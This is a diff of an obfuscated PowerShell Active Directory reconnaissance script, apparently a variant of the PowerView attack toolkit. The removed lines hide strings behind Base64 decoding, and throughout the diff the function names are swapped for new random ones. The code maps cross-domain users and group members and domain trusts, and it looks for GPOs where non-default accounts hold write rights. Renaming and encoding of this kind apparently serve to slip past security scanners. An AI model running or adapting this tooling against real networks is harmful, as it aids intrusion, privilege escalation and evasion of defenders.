-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $Raw }
+        $SearcherArguments['LDAPFilter'] = '(memberof=*)'
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
     }
 
     PROCESS {
-        cqaorm @SearcherArguments  | ForEach-Object {
+        ykrker @SearcherArguments  | ForEach-Object {
             ForEach ($Membership in $_.memberof) {
-                $Index = $Membership.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))
+                $Index = $Membership.IndexOf('DC=')
                 if ($Index) {
 
-                    $GroupDomain = $($Membership.SubString($Index)) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'
                     $UserDistinguishedName = $_.distinguishedname
-                    $UserIndex = $UserDistinguishedName.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))
-                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')
+                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'
 
                     if ($GroupDomain -ne $UserDomain) {
                         
-                        $GroupName = $Membership.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))[1]
+                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                         $ForeignUser = New-Object PSObject
-                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRvbWFpbg=="))) $UserDomain
-                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $_.samaccountname
-                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlckRpc3Rpbmd1aXNoZWROYW1l"))) $_.distinguishedname
-                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $GroupDomain
-                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
-                        $ForeignUser | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEaXN0aW5ndWlzaGVkTmFtZQ=="))) $Membership
-                        $ForeignUser.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZvcmVpZ25Vc2Vy"))))
+                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain
+                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
+                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
+                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
+                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
+                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership
+                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                         $ForeignUser
                     }
                 }
@@ -12352,7 +12356,7 @@ function ikhlpc {
 }
 
 
-function aokraa {
+function efkjde {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -12386,7 +12390,7 @@ function aokraa {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -12410,45 +12414,45 @@ function aokraa {
 
     BEGIN {
         $SearcherArguments = @{}
-        $SearcherArguments['LDAPFilter'] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG1lbWJlcj0qKQ==")))
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $Raw }
+        $SearcherArguments['LDAPFilter'] = '(member=*)'
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
     }
 
     PROCESS {
         
-        $ExcludeGroups = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcnM="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluIFVzZXJz"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3Vlc3Rz"))))
+        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')
 
-        pvupkd @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
+        xcrlsg @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {
             $GroupName = $_.samAccountName
             $GroupDistinguishedName = $_.distinguishedname
-            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
 
             $_.member | ForEach-Object {
                 
                 
-                $MemberDomain = $_.SubString($_.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                if (($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049Uy0xLTUtMjEuKi0uKg==")))) -or ($GroupDomain -ne $MemberDomain)) {
+                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {
                     $MemberDistinguishedName = $_
-                    $MemberName = $_.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))[1]
+                    $MemberName = $_.Split(',')[0].split('=')[1]
 
                     $ForeignGroupMember = New-Object PSObject
-                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEb21haW4="))) $GroupDomain
-                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBOYW1l"))) $GroupName
-                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBEaXN0aW5ndWlzaGVkTmFtZQ=="))) $GroupDistinguishedName
-                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRG9tYWlu"))) $MemberDomain
-                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyTmFtZQ=="))) $MemberName
-                    $ForeignGroupMember | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWU="))) $MemberDistinguishedName
-                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkZvcmVpZ25Hcm91cE1lbWJlcg=="))))
+                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $GroupDomain
+                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName
+                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName
+                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
+                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName
+                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName
+                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                     $ForeignGroupMember
                 }
             }
@@ -12457,7 +12461,7 @@ function aokraa {
 }
 
 
-function wtzpsu {
+function cnwodw {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -12501,7 +12505,7 @@ function wtzpsu {
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [Parameter(ParameterSetName = 'LDAP')]
         [ValidateRange(1, 10000)]
@@ -12530,24 +12534,24 @@ function wtzpsu {
     $Domains = New-Object System.Collections.Stack
 
     $DomainTrustArguments = @{}
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ")))] = $API }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVU")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVU")))] = $NET }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }
+    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }
+    if ($PSBoundParameters['LDAPFilter']) { $DomainTrustArguments['LDAPFilter'] = $LDAPFilter }
+    if ($PSBoundParameters['Properties']) { $DomainTrustArguments['Properties'] = $Properties }
+    if ($PSBoundParameters['SearchBase']) { $DomainTrustArguments['SearchBase'] = $SearchBase }
+    if ($PSBoundParameters['Server']) { $DomainTrustArguments['Server'] = $Server }
+    if ($PSBoundParameters['SearchScope']) { $DomainTrustArguments['SearchScope'] = $SearchScope }
+    if ($PSBoundParameters['ResultPageSize']) { $DomainTrustArguments['ResultPageSize'] = $ResultPageSize }
+    if ($PSBoundParameters['ServerTimeLimit']) { $DomainTrustArguments['ServerTimeLimit'] = $ServerTimeLimit }
+    if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }
+    if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }
 
     
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-        $CurrentDomain = (wjdyuo -Credential $Credential).Name
+    if ($PSBoundParameters['Credential']) {
+        $CurrentDomain = (owdzhi -Credential $Credential).Name
     }
     else {
-        $CurrentDomain = (wjdyuo).Name
+        $CurrentDomain = (owdzhi).Name
     }
     $Domains.Push($CurrentDomain)
 
@@ -12558,26 +12562,26 @@ function wtzpsu {
         
         if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
 
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdE1hcHBpbmddIEVudW1lcmF0aW5nIHRydXN0cyBmb3IgZG9tYWluOiAnJERvbWFpbg==")))
+            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"
 
             
             $Null = $SeenDomains.Add($Domain, '')
 
             try {
                 
-                $DomainTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
-                $Trusts = wajfkh @DomainTrustArguments
+                $DomainTrustArguments['Domain'] = $Domain
+                $Trusts = rbjxkd @DomainTrustArguments
 
                 if ($Trusts -isnot [System.Array]) {
                     $Trusts = @($Trusts)
                 }
 
                 
-                if ($PsCmdlet.ParameterSetName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TkVU")))) {
+                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                     $ForestTrustArguments = @{}
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $ForestTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ForestTrustArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-                    $Trusts += cnfeft @ForestTrustArguments
+                    if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }
+                    if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }
+                    $Trusts += piaqbp @ForestTrustArguments
                 }
 
                 if ($Trusts) {
@@ -12596,20 +12600,20 @@ function wtzpsu {
                 }
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5UcnVzdE1hcHBpbmddIEVycm9yOiB7MH0="))) -f $_)
+                Write-Verbose ("[Get-DomainTrustMapping] Error: {0}" -f $_)
             }
         }
     }
 }
 
 
-function yzrqoc {
+function sbxkit {
 
 
     [CmdletBinding()]
     Param (
         [String]
-        $GPOName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))),
+        $GPOName = '*',
 
         [ValidateRange(1,10000)] 
         [Int]
@@ -12622,21 +12626,21 @@ function yzrqoc {
     $DomainList = @($Forest.Domains)
     $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
     foreach ($Domain in $Domains) {
-        $Filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpKGRpc3BsYXluYW1lPSRHUE9OYW1lKSk=")))
+        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
         $Searcher = New-Object System.DirectoryServices.DirectorySearcher
         $Searcher.SearchRoot = $Domain
         $Searcher.Filter = $Filter
         $Searcher.PageSize = $PageSize
-        $Searcher.SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ==")))
+        $Searcher.SearchScope = "Subtree"
         $listGPO = $Searcher.FindAll()
         foreach ($gpo in $listGPO){
-            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGU="))) -and $_.AccessControlType -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c="))) -and  $Exclusions -notcontains $_.IdentityReference.toString().split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1] -and $_.IdentityReference -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1JFQVRPUiBPV05FUg==")))}
+            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
         if ($ACL -ne $null){
             $GpoACL = New-Object psobject
-            $GpoACL | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QURTUGF0aA=="))) $gpo.Properties.adspath
-            $GpoACL | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BPRGlzcGxheU5hbWU="))) $gpo.Properties.displayname
-            $GpoACL | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2U="))) $ACL.IdentityReference
-            $GpoACL | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWN0aXZlRGlyZWN0b3J5UmlnaHRz"))) $ACL.ActiveDirectoryRights
+            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
+            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
+            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
+            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
             $GpoACL
         }
         }
@@ -12653,38 +12657,38 @@ function yzrqoc {
 
 
 
-$Mod = jgrjya -ModuleName Win32
+$Mod = vzwvqh -ModuleName Win32
 
 
 
 
-$SamAccountTypeEnum = boiwqt $Mod PowerView.SamAccountTypeEnum UInt32 @{
-    DOMAIN_OBJECT                   =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMA==")))
-    GROUP_OBJECT                    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxMDAwMDAwMA==")))
-    NON_SECURITY_GROUP_OBJECT       =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxMDAwMDAwMQ==")))
-    ALIAS_OBJECT                    =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgyMDAwMDAwMA==")))
-    NON_SECURITY_ALIAS_OBJECT       =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgyMDAwMDAwMQ==")))
-    USER_OBJECT                     =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgzMDAwMDAwMA==")))
-    MACHINE_ACCOUNT                 =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgzMDAwMDAwMQ==")))
-    TRUST_ACCOUNT                   =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgzMDAwMDAwMg==")))
-    APP_BASIC_GROUP                 =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0MDAwMDAwMA==")))
-    APP_QUERY_GROUP                 =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0MDAwMDAwMQ==")))
-    ACCOUNT_TYPE_MAX                =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg3ZmZmZmZmZg==")))
+$SamAccountTypeEnum = twmjlt $Mod PowerView.SamAccountTypeEnum UInt32 @{
+    DOMAIN_OBJECT                   =   '0x00000000'
+    GROUP_OBJECT                    =   '0x10000000'
+    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
+    ALIAS_OBJECT                    =   '0x20000000'
+    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
+    USER_OBJECT                     =   '0x30000000'
+    MACHINE_ACCOUNT                 =   '0x30000001'
+    TRUST_ACCOUNT                   =   '0x30000002'
+    APP_BASIC_GROUP                 =   '0x40000000'
+    APP_QUERY_GROUP                 =   '0x40000001'
+    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
 }
 
 
-$GroupTypeEnum = boiwqt $Mod PowerView.GroupTypeEnum UInt32 @{
-    CREATED_BY_SYSTEM               =   ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMQ==")))
